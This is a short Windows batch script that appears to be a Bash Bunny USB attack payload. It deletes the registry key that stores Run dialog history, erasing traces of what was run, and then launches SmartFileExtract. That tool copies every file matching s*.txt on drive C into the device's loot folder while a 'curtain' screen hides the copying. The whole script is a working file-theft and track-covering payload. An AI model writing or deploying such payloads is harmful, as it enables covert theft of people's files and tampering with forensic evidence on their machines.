@echo off
REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Setup required:
REM o Create SFE in the loot directory
REM o Place SmartFileExtract on the root of the bashbunny
cd /d %~dp0
cd ../../loot/SFE
REM Example below is a search for all s*.txt using install curtain
REM Add addition parameters as needed

start %~dp0..\..\SmartFileExtract.exe /drive c /file s*.txt /copyto ../../loot/SFE /curtain 3
@exit